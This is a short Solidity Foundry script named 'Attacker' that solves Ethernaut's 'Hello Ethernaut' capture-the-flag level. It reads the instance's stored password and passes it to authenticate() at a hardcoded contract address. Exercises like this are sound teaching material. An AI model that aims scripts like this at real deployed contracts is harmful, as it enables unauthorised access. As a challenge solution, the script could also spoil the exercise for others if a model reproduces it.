pragma solidity ^0.8.0;

import "../instances/HelloEthernaut.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Instance level0 = Instance(0x6a99640cE5880b41784570BcDb2091A8D1836994);

    function run() external{
        vm.startBroadcast();
        level0.password();
        level0.authenticate(level0.password());
        vm.stopBroadcast();
    }

}

